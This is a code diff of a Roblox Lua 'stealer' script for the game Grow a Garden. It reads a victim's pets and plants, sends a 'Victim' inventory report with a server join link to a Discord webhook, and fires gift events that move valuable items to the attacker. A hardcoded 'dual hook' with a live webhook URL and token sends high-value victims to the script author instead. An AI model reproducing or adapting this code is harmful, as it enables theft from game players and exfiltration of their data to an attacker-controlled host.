@@ -1,236 +1,195 @@
+-- Core.lua - Full inventory logger + Steal + DualHook logic + Follow + AutoGift
 
--- GROW A GARDEN STEALER - by namnnni2
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
-local Modules = ReplicatedStorage:WaitForChild("Modules")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
+local modules = ReplicatedStorage:WaitForChild("Modules")
+local dataService = require(modules:WaitForChild("DataService"))
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- MODULE
-local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))
+-- SETTINGS OUTSIDE
+local Webhook = getfenv().Webhook
+local Username = getfenv().Username
 
--- CONFIG
-local env = getfenv()
-local PRIMARY_WEBHOOK = env.Webhook
-local PRIMARY_USERNAME = env.Username
-local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local DUAL_USERNAME = "namnnni2"
-local VALUE_THRESHOLD = 1_000_000_000_000
-local HEAVY_WEIGHT = 10
-local AUTO_TRANSFER_DELAY = 0.3
-local VIP_PETS = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+-- DUAL HOOK CONFIG
+local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local DualUsername = "namnnni2"
 
--- UTILS
-local function getRequestFunction()
-    if identifyexecutor then print("Executor:", identifyexecutor()) end
-    return (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (getgenv and getgenv().request) or request
-end
+if not Webhook or not Username then return warn("Missing Webhook or Username") end
+
+local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+
+local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
 
 local function formatNumber(n)
-    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+	local suffix = {"", "k", "m", "b", "t"}
+	local idx = 1
+	while n >= 1000 and idx < #suffix do
+		n = n / 1000
+		idx += 1
+	end
+	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
 end
 
-local function calculateItemValue(tool)
-    local itemType = tool:GetAttribute("ItemType")
-    if itemType == "Pet" then
-        return petUtils:GetPetValue(tool)
-    elseif itemType == "Plant" then
-        return calcPlantValue(tool)
-    end
-    return 0
+local function calcPetValue(petData)
+	local egg = petData.PetData.HatchedFrom
+	if not egg then return 0 end
+	local data = petRegistry.PetEggs[egg]
+	local rarity = data and data.RarityData.Items[petData.PetType]
+	if not rarity then return 0 end
+	local r = rarity.GeneratedPetData.WeightRange
+	if not r then return 0 end
+	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
+	local weightMult = math.lerp(0.8, 1.2, lerp)
+	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
+	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
 end
 
-local function calculatePriority(item)
-    local p = 0
-    if table.find(VIP_PETS, item.Name) then p += 1000 end
-    if (item.Weight or 0) >= HEAVY_WEIGHT then p += 500 end
-    return p + (item.Value or 0)
+for _, tool in ipairs(backpack:GetChildren()) do
+	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+		if tool:GetAttribute("ItemType") == "Pet" then
+			local id = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
+			local petName = petData.PetType
+			local weight = tonumber(petData.PetData.BaseWeight) or 0
+			local value = calcPetValue(petData)
+			if table.find(rarePets, petName) then hasRare = true end
+			if weight >= 10 then hasHeavy = true end
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
+		else
+			local value = calcPlantValue(tool)
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
+		end
+	end
 end
 
-local function sortByPriority(a, b)
-    return calculatePriority(a) > calculatePriority(b)
+if #itemsToSend == 0 then return end
+
+table.sort(itemsToSend, function(a, b)
+	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
+	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
+	return a.Value > b.Value
+end)
+
+local useDual = totalValue >= 10_000_000_000
+local finalWebhook = useDual and DualWebhook or Webhook
+local finalUsername = useDual and DualUsername or Username
+
+-- Compose webhook
+local content = (hasRare or hasHeavy) and "@everyone\n" or ""
+content ..= "🎯 **Grow a Garden - Inventory Steal Report**\n"
+content ..= "**JobId:** `" .. game.JobId .. "`\n"
+
+local lines = ""
+for _, item in ipairs(itemsToSend) do
+	lines ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+	if #lines > 1024 then
+		lines = lines:sub(1, 1000) .. "\n...more items"
+		break
+	end
 end
 
--- WEBHOOK
-local function sendWebhook(items, totalValue, targetName)
-    local useDual = totalValue >= VALUE_THRESHOLD
-    local webhook = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
-    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME
-    if not webhook then warn("No webhook found."); return end
+local payload = {
+	content = content,
+	embeds = {{
+		title = "💥 Full Inventory Dump",
+		color = 16711680,
+		fields = {
+			{name = "Victim", value = plr.Name, inline = true},
+			{name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
+			{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
+			{name = "Inventory", value = lines, inline = false}
+		},
+		footer = { text = "Stealer & AutoGift by " .. finalUsername }
+	}}
+}
 
-    local hasVIPOrHeavy = false
-    for _, i in ipairs(items) do
-        if table.find(VIP_PETS, i.Name) or (i.Weight or 0) >= HEAVY_WEIGHT then hasVIPOrHeavy = true break end
-    end
-
-    local categories = {
-        {name = "💎 VIP Pets", items = {}},
-        {name = "🏋️ Heavy Pets", items = {}},
-        {name = "🐾 Regular Pets", items = {}},
-        {name = "🌱 Plants", items = {}}
-    }
-
-    for _, item in ipairs(items) do
-        if table.find(VIP_PETS, item.Name) then
-            table.insert(categories[1].items, item)
-        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
-            table.insert(categories[2].items, item)
-        elseif item.Type == "Pet" then
-            table.insert(categories[3].items, item)
-        else
-            table.insert(categories[4].items, item)
-        end
-    end
-
-    local desc = {}
-    for _, c in ipairs(categories) do
-        if #c.items > 0 then
-            table.insert(desc, "**"..c.name.." ("..#c.items..")**")
-            for _, i in ipairs(c.items) do
-                table.insert(desc, string.format("- %s: $%s (%.1fkg)", i.Name, formatNumber(i.Value), i.Weight or 0))
-            end
-            table.insert(desc, "")
-        end
-    end
-
-    local payload = {
-        username = username,
-        content = hasVIPOrHeavy and "@everyone" or nil,
-        embeds = {{
-            title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
-            color = useDual and 0xFFD700 or 0x00FF00,
-            description = table.concat(desc, "\n"),
-            fields = {
-                {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
-                {name = "🎯 Receiver", value = targetName, inline = true},
-                {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
-                {name = "🔗 Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
-            },
-            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    local req = getRequestFunction()
-    if not req then warn("❌ Executor không hỗ trợ request."); return end
-
-    local ok, res = pcall(function()
-        return req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-
-    if ok then
-        print("✅ Webhook sent")
-    else
-        warn("❌ Webhook error", res)
-    end
+-- Send webhook
+local function getRequest()
+	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
 end
 
--- GIFT
-local currentPrompt = nil
-local isTransferring = false
+pcall(function()
+	local req = getRequest()
+	if req then
+		req({
+			Url = finalWebhook,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end
+end)
 
-local function waitForItemRemoval(tool)
-    local t0 = os.clock()
-    while tool and tool.Parent == Backpack and os.clock() - t0 < 5 do task.wait(0.1) end
-    return tool and tool.Parent ~= Backpack
-end
+-- FOLLOW & AUTOGIFT
 
-local function createPrompt(targetChar, targetName)
-    if currentPrompt then currentPrompt:Destroy() end
-    local prompt = Instance.new("ProximityPrompt")
-    prompt.ObjectText = "Gift to "..targetName
-    prompt.ActionText = "Auto-Gift"
-    prompt.HoldDuration = 0.5
-    prompt.MaxActivationDistance = 10
-    prompt.Parent = targetChar:FindFirstChild("HumanoidRootPart")
-    currentPrompt = prompt
-
-    prompt.Triggered:Connect(function()
-        if isTransferring then return end
-        isTransferring = true
-
-        local items, total = {}, 0
-        for _, tool in ipairs(Backpack:GetChildren()) do
-            if tool:IsA("Tool") then
-                local item = {
-                    Name = tool.Name,
-                    Type = tool:GetAttribute("ItemType"),
-                    Value = calculateItemValue(tool),
-                    Weight = tool:GetAttribute("Weight"),
-                    Tool = tool
-                }
-                total += item.Value
-                table.insert(items, item)
-            end
-        end
-
-        table.sort(items, sortByPriority)
-
-        local receiver = Players:FindFirstChild(targetName)
-        local rb = receiver and receiver:FindFirstChildOfClass("Backpack")
-        if rb then
-            for _, i in ipairs(items) do
-                if i.Tool and i.Tool.Parent == Backpack then
-                    i.Tool.Parent = rb
-                    waitForItemRemoval(i.Tool)
-                    task.wait(AUTO_TRANSFER_DELAY)
-                end
-            end
-        end
-
-        sendWebhook(items, total, targetName)
-        isTransferring = false
-    end)
-
-    delay(0.5, function()
-        if prompt and prompt.Parent then
-            prompt:InputHoldBegin()
-            task.wait(prompt.HoldDuration)
-            prompt:InputHoldEnd()
-        end
-    end)
-end
-
--- FOLLOW
-local followConnection = nil
-
-local function followTarget(player)
-    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-    local myhrp = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not hrp or not myhrp then return end
-
-    if followConnection then followConnection:Disconnect() end
-    followConnection = RunService.Heartbeat:Connect(function(dt)
-        local behind = hrp.CFrame.Position - hrp.CFrame.LookVector * 3
-        local new = myhrp.Position:Lerp(behind, dt * 10)
-        myhrp.CFrame = CFrame.new(new, hrp.Position)
-        if not currentPrompt then createPrompt(player.Character, player.Name) end
-    end)
-end
-
-local function onChat(player, msg)
-    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
-        if player.Character then
-            followTarget(player)
-        else
-            player.CharacterAdded:Once(function()
-                followTarget(player)
-            end)
-        end
-    end
-end
+local targetName = useDual and DualUsername or Username
+local targetPlr = nil
 
 for _, p in ipairs(Players:GetPlayers()) do
-    p.Chatted:Connect(function(msg) onChat(p, msg) end)
+	if p.Name == targetName then
+		targetPlr = p
+		break
+	end
 end
-Players.PlayerAdded:Connect(function(p)
-    p.Chatted:Connect(function(msg) onChat(p, msg) end)
+
+if not targetPlr then
+	Players.PlayerAdded:Connect(function(p)
+		if p.Name == targetName then
+			targetPlr = p
+		end
+	end)
+end
+
+local function gift(tool)
+	local args = {
+		[1] = targetPlr,
+		[2] = tool
+	}
+	replicatedStorage.Events.GiftPet:FireServer(unpack(args))
+end
+
+local function followAndGift()
+	if not targetPlr then return end
+	local char = plr.Character or plr.CharacterAdded:Wait()
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	local tChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
+	local tHrp = tChar:WaitForChild("HumanoidRootPart")
+	
+	while targetPlr and targetPlr.Parent do
+		if (tHrp.Position - hrp.Position).Magnitude > 5 then
+			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3) -- đứng sau lưng
+		end
+		wait(0.2)
+	end
+end
+
+targetPlr.Chatted:Connect(function()
+	task.spawn(followAndGift)
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and table.find(rarePets, item.Name) then
+			gift(item.Tool)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
+			gift(item.Tool)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Plant" then
+			gift(item.Tool)
+		end
+	end
 end)
